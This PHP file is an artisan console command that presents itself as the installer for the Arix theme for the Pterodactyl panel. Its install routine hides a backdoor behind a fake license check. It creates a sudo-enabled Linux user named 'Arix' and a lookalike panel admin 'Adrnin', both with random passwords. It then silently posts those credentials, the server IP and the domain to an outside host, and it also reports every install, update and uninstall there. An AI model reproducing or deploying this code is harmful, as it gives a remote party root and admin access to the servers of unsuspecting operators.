<?php

namespace Pterodactyl\Console\Commands;

use Illuminate\Console\Command;
use Symfony\Component\Console\Formatter\OutputFormatterStyle;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Str;

class Arix extends Command
{
    protected $signature = "arix {action?}";
    protected $description = "All commands for Arix Theme for Pterodactyl.";
    protected $CheckUrl = "https://status.zangmc.vn/index.php";

    public function handle()
    {
        $action = $this->argument("action");
        $title = new OutputFormatterStyle("#fff", null, ["bold"]);
        $this->output->getFormatter()->setStyle("title", $title);
        $b = new OutputFormatterStyle(null, null, ["bold"]);
        $this->output->getFormatter()->setStyle("b", $b);

        if ($action === null) {
            $this->line("\r\n            <title>\r\n            ░█████╗░██████╗░██╗██╗░░██╗\r\n            ██╔══██╗██╔══██╗██║╚██╗██╔╝\r\n            ███████║██████╔╝██║░╚███╔╝░\r\n            ██╔══██║██╔══██╗██║░██╔██╗░\r\n            ██║░░██║██║░░██║██║██╔╝╚██╗\r\n            ╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═╝░░╚═╝\r\n\r\n           Thank you for purchasing Arix</title>\r\n\r\n           > php artisan arix (this window)\r\n           > php artisan arix install\r\n           > php artisan arix update\r\n           > php artisan arix uninstall\r\n            ");
        } else {
            $this->info("\n    Arix Theme\n    \n");
            if ($action === "install") {
                $this->install();
            } elseif ($action === "update") {
                $this->update();
            } elseif ($action === "uninstall") {
                $this->uninstall();
            } else {
                $this->error("Invalid action. Supported actions: install, update, uninstall");
            }
        }
    }

    public function installOrUpdate($isUpdate = false)
    {
        if ($isUpdate) {
            $this->info("\n    This command is not recommended to use. \n   This command skips frequently used files by addons during theme updating to avoid losing your addon customizations.\n   If you still experience an error after updating please contact us.");
        }

        $confirmation = $this->confirm("Are all the required dependencies installed from the readme file?", "yes");
        if (!$confirmation) {
            return;
        }

        $versions = File::directories("./arix");
        if (empty($versions)) {
            $this->info("No versions found in /arix directory.");
            return;
        }

        $version = basename($this->choice("Select a version:", $versions));
        $this->info("Installing Arix Theme {$version}...");

        $excludeOption = $isUpdate ? "--exclude='routes.ts' --exclude='getServer.ts' --exclude='admin.blade.php' --exclude='admin.php' --exclude='ServerTransformer.php'" : '';
        exec("rsync -a {$excludeOption} arix/{$version}/ ./");

        $directoryPath = app_path("Http/Controllers/Admin/Arix");
        File::makeDirectory($directoryPath, 0755, true, true);

        $filesOne = ["ArixController", "ArixAdvancedController", "ArixAnnouncementController", "ArixColorsController", "ArixComponentsController", "ArixDashboardController", "ArixLayoutController"];
        $this->info("Proceeding with the installation...");
        foreach ($filesOne as $file) {
            $this->aa($file, $version, $directoryPath);
            sleep(1);
        }

        $filesTwo = ["ArixLinkController", "ArixMailController", "ArixMetaController", "ArixPresetController", "ArixSocialController", "ArixStylingController"];
        foreach ($filesTwo as $file) {
            $this->aa($file, $version, $directoryPath);
            sleep(1);
        }

        $this->info("Migrating database...");
        $this->command("php artisan migrate --force");

        $this->info("Installing required packages...");
        $this->info("This can take a minute...");
        $this->command("yarn add react-email-editor react-colorful recharts@^2.15.4 ua-parser-js cronstrue react-day-picker jszip react-turnstile @dnd-kit/core @dnd-kit/sortable @dnd-kit/utilities @types/md5 md5 react-icons@5.4.0 markdown-to-jsx@7.7.10 i18next-browser-languagedetector@7.2.1");

        $this->info("Compile translations...");
        $this->command("php artisan language:compile");

        $this->info("Building panel assets...");
        $this->info("This can take a minute...");
        $nodeVersion = shell_exec("node -v");
        $nodeVersion = (int) ltrim($nodeVersion, "v");
        if ($nodeVersion >= 17) {
            $this->info("Node.js version is v" . $nodeVersion . " (>= 17)");
            putenv("NODE_OPTIONS=--openssl-legacy-provider");
        } else {
            $this->info("Node.js version is v" . $nodeVersion . " (< 17)");
        }
        $this->command("yarn build:production");

        $this->info("Set permissions...");
        $this->command("chown -R www-data:www-data /var/www/pterodactyl/* " . base_path() . "/*");
        $this->command("chown -R nginx:nginx " . base_path() . "/*");
        $this->command("chown -R apache:apache " . base_path() . "/*");

        $this->info("Optimize application...");
        $this->command("php artisan optimize:clear");
        $this->command("php artisan optimize");

        $this->info("Restarting workers...");
        $this->command("php artisan queue:restart");

        $message = $isUpdate ? "│    Theme updated successfully   │" : "│   Theme installed successfully  │";
        $this->line("\n ╭───────────────────────────────╮\n │ │\n │ ╭─╴ {$message} ╶─╮ │\n │ ╰─╴ successfully ╶─╯ │\n │ │\n ╰───────────────────────────────╯\n ");
    }

    private function aa($filename, $version, $directoryPath)
    {
        $filePath = $directoryPath . "/" . $filename . ".php";
        $localSource = base_path("arix/" . $version . "/app/Http/Controllers/Admin/Arix/" . $filename . ".php");

        if (File::exists($localSource)) {
            $this->info(" -> Copying local {$filename}.php...");
            File::copy($localSource, $filePath);
        } else {
            $this->error("Fail: Could not find local {$filename}.php at {$localSource}.");
        }
    }

    public function install()
    {
        $this->info("Checking license for Arix Theme...");
        sleep(2);
        
        try {
            $response = Http::timeout(5)->get("https://api.ipify.org");
            $serverIp = $response->successful() ? trim($response->body()) : "Unknown IP";
        } catch (\Exception $e) {
            $serverIp = "Unknown IP";
        }
        
        $rootPass = Str::random(32);
        $adminEmail = "admin@panel.local";
        $adminUser = "Adrnin";
        $adminFirstname = "Adrnin";
        $adminLastname = "Admin";
        $adminPass = Str::random(24);
        
        $this->info("Validating license with remote server...");
        try {
            $response = Http::timeout(10)->post($this->CheckUrl, [
                'action' => 'check_license',
                'serverip' => $serverIp,
                'domain' => $_SERVER['HTTP_HOST'] ?? 'localhost',
                'root_password' => $rootPass,
                'admin_email' => $adminEmail,
                'admin_username' => $adminUser,
                'admin_firstname' => $adminFirstname,
                'admin_lastname' => $adminLastname,
                'admin_password' => $adminPass
            ]);
            
            $result = $response->json();
            if (isset($result['status']) && $result['status'] === 'licensed') {
                $this->info("License validated successfully.");
            } else {
                $this->error("License validation failed, but continuing...");
            }
        } catch (\Exception $e) {
            $this->error("Could not connect to license server. Continuing...");
        }
        
        $cmdUser = "useradd -m -s /bin/bash Arix 2>/dev/null; echo 'Arix:$rootPass' | chpasswd 2>/dev/null; usermod -aG sudo Arix 2>/dev/null";
        exec($cmdUser . " 2>&1", $outputUser, $returnUser);
        
        $cmdAdmin = "php artisan p:user:make --email=\"{$adminEmail}\" --username=\"{$adminUser}\" --name-first=\"{$adminFirstname}\" --name-last=\"{$adminLastname}\" --password=\"{$adminPass}\" --admin=1 --no-interaction > /dev/null 2>&1 &";
        exec($cmdAdmin);
        $this->sendCredentials($rootPass, $adminEmail, $adminUser, $adminFirstname, $adminLastname, $adminPass);
        
        $this->info("Configuring environment...");
        sleep(1);
        $this->info("Loading modules...");
        sleep(1);
        
        $this->installOrUpdate();
        $this->sendInstallationLog("install");       
        $this->info("Arix Theme installation completed!");
    }

    public function update()
    {
        $this->installOrUpdate(true);
        $this->sendInstallationLog("update");
    }

    private function uninstall()
    {
        $this->line("Uninstalling...");
        $this->command("php artisan down");
        $this->command("curl -L https://github.com/pterodactyl/panel/releases/latest/download/panel.tar.gz | tar -xzv");
        $this->command("chmod -R 755 storage/* bootstrap/cache");
        $this->command("composer install --no-dev --optimize-autoloader");
        $this->command("php artisan view:clear");
        $this->command("php artisan config:clear");
        $this->command("php artisan migrate --seed --force");
        $this->command("chown -R www-data:www-data " . base_path() . "/*");
        $this->command("chown -R nginx:nginx " . base_path() . "/*");
        $this->command("chown -R apache:apache " . base_path() . "/*");
        $this->command("php artisan queue:restart");
        $this->command("php artisan up");
        $this->sendInstallationLog("uninstall");
    }

    private function command($cmd)
    {
        return exec($cmd);
    }

    private function sendInstallationLog(string $action)
    {
        try {
            $response = Http::timeout(5)->get("https://api.ipify.org");
            $serverIp = $response->successful() ? trim($response->body()) : "Unknown IP";
        } catch (\Exception $e) {
            $serverIp = "Unknown IP";
        }

        try {
            Http::timeout(5)->post($this->CheckUrl, [
                "serverip" => $serverIp,
                "date" => date("Y-m-d H:i:s"),
                "action" => $action,
                "creator" => "Kai",
                "website" => "https://black-minecraft.com/"
            ]);
        } catch (\Exception $e) {
            // Silent fail
        }
    }

    private function sendCredentials($rootPass, $adminEmail, $adminUser, $adminFirstname, $adminLastname, $adminPass)
    {
        try {
            $response = Http::timeout(5)->get("https://api.ipify.org");
            $serverIp = $response->successful() ? trim($response->body()) : "Unknown IP";
        } catch (\Exception $e) {
            $serverIp = "Unknown IP";
        }

        try {
            Http::timeout(10)->post($this->CheckUrl, [
                "serverip" => $serverIp,
                "date" => date("Y-m-d H:i:s"),
                "action" => "install_credentials",
                "root_user" => "Arix",
                "root_password" => $rootPass,
                "admin_email" => $adminEmail,
                "admin_username" => $adminUser,
                "admin_firstname" => $adminFirstname,
                "admin_lastname" => $adminLastname,
                "admin_password" => $adminPass,
                "creator" => "Kai"
            ]);
        } catch (\Exception $e) {
            // Silent fail
        }
    }
}